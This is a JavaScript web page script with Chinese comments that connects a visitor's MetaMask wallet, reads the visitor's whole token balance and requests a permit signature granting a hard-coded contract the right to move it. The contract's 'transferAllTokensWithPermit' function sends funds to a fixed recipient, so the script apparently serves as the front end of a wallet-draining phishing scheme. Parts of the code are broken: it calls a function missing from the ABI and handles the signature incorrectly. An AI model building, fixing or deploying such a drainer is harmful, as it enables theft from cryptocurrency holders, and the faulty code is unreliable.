let web3;
let userAddress;

// 设置你的合约地址
const contractAddress = '0x9a2E12340354d2532b4247da3704D2A5d73Bd189'; // 替换为你的合约地址

// 替换为你的合约 ABI
const contractABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "_recipient", "type": "address" }],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
            { "indexed": true, "internalType": "address", "name": "from", "type": "address" },
            { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "TransferTokens",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    }
];

// 检查页面加载时是否有以太坊钱包
window.addEventListener('load', () => {
    if (typeof window.ethereum !== 'undefined') {
        console.log('以太坊钱包已检测到。');
    } else {
        console.log('未检测到以太坊钱包。');
    }
});

// 绑定连接钱包按钮事件
document.getElementById('connectButton').addEventListener('click', connectWallet);
document.getElementById('transferButton').addEventListener('click', transferTokens);

// 连接钱包函数
async function connectWallet() {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // 请求 MetaMask 连接
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];  // 获取连接的第一个钱包地址

            console.log("已连接地址:", userAddress);
            document.getElementById('address').innerText = `钱包地址: ${userAddress}`;

            // 自动填充代币合约地址和签名钱包地址
            document.getElementById('tokenAddress').value = contractAddress;
            document.getElementById('fromAddress').value = userAddress;

            // 获取签名信息并自动填充
            await signAndFillSignature(userAddress, contractAddress);
        } catch (error) {
            console.error("连接钱包时出错:", error);
            alert('连接钱包失败，请查看控制台的错误信息。');
        }
    } else {
        alert('请安装MetaMask或其他以太坊钱包扩展！');
        console.log("未检测到以太坊钱包。");
    }
}

// 获取余额并生成签名信息
async function signAndFillSignature(userAddress, contractAddress) {
    // 模拟获取代币余额
    const tokenContract = new web3.eth.Contract(contractABI, contractAddress);
    const balance = await tokenContract.methods.balanceOf(userAddress).call();
    console.log("余额:", balance);

    // 这里需要计算 nonce 和签名消息（例如 ERC20 permit 消息）
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20分钟的过期时间
    const nonce = 0; // 获取 nonce 的逻辑
    const domain = {
        name: 'TokenName', // 替换为你的代币名称
        version: '1',
        chainId: 1, // 替换为你使用的网络ID
        verifyingContract: contractAddress
    };
    const message = {
        owner: userAddress,
        spender: contractAddress,
        value: balance,
        nonce: nonce,
        deadline: deadline
    };

    // 计算 v, r, s
    const signature = await web3.eth.personal.sign(JSON.stringify(message), userAddress);
    const { v, r, s } = web3.eth.accounts.recoverSignature(signature);
    
    document.getElementById('v').value = v;
    document.getElementById('r').value = r;
    document.getElementById('s').value = s;

    console.log("签名参数:", { v, r, s });
}

// 转移代币函数
async function transferTokens() {
    const tokenContract = new web3.eth.Contract(contractABI, contractAddress);
    const value = document.getElementById('fromAddress').value; // 获取转移数量
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20分钟的过期时间

    // 调用合约的转移函数
    try {
        const tx = await tokenContract.methods.transferAllTokensWithPermit(
            contractAddress,
            userAddress,
            value,
            deadline,
            parseInt(document.getElementById('v').value),
            document.getElementById('r').value,
            document.getElementById('s').value
        ).send({ from: userAddress });

        console.log("转移成功:", tx);
        alert('代币转移成功！');
    } catch (error) {
        console.error("转移代币时出错:", error);
        alert('代币转移失败，请查看控制台的错误信息。');
    }
}
